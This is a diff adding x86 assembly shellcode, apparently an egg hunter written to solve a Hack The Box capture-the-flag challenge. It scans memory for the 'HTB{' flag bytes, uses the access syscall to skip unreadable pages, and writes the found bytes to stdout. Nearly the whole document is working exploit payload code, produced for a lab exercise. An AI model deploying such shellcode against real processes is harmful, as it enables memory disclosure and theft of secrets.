@@ -1,0 +1,54 @@
+section .text
+    global _start
+
+# The idea is to scan memory looking for the bytes: "HTB{" => "{BTH" because of endianness
+# After 4 bytes is found, write that memory to stdout, which is 1
+# after writing to stdout, exit gracefully? <-- not sure if this is needed
+# hunting is a 32 bit executable so need int 0x80 instead of x64
+# sys_write is syscall 4
+# 	sys_write	fs/read_write.c	unsigned int	const char *	size_t
+# sys_access is  33
+# 33	sys_access	fs/open.c	const char *	int  
+# sys_alarm is 27
+# use access to check that a page is readable
+
+_start:
+
+    # Loop to check if this memory is readable
+    mov ebx, 0x5ffffffc # Start at this address
+   
+_check_read:
+    add ebx, 4
+    mov eax, 33
+    int 0x80
+
+    
+    # Check return value, 0= success, -1 = failure
+    # If readable: Check if the egg is found
+    cmp eax, 0xffffffff
+    je _check_read
+
+
+    # Egg was found, check it is the correct value
+    mov eax, [ebx]
+    cmp eax, 0x7b425448
+    jne _check_read
+
+    # This was the correct value, write to stdout
+    mov ecx, ebx
+    mov ebx, 1
+    mov edx, 0x20
+    mov eax, 4
+    int 0x80
+
+    xor ebx, ebx
+    mov eax, 1
+    int 0x80
+
+
+    
+
+
+
+
+
